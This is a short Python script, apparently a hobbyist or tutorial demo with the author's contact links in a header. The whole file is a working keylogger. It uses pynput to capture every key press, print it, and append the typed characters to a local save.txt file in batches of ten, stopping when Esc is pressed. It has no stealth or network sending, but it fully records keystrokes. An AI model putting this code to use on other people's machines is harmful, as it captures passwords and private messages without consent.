
"""
@author: Kianoush 

GitHUb:https://github.com/Kianoush-h
YouTube: https://www.youtube.com/channel/UCvf9_53f6n3YjNEA4NxAkJA?view_as=subscriber
LinkedIn: https://www.linkedin.com/in/kianoush-haratiannejadi/

Email: haratiank2@gmail.com

"""

import pynput


count = 0 
keys = []

def press(key):
    global keys,count
    keys.append(key)
    count += 1
    print(key)
    
    if count >= 10:
        count = 0
        save(keys)
        keys = []
        
        
def save(keys):
    with open("save.txt",'a') as file:
        for key in keys:
            _key = str(key).replace("'","")
            if _key.find("space") > 0:
                file.write('\n')
            elif _key.find("key") == -1:
                file.write(_key)
                
                

def release(key):
    if key == pynput.keyboard.Key.esc:
        return False
    
    
with pynput.keyboard.Listener(on_press = press, on_release = release) as listener:
    listener.join()



















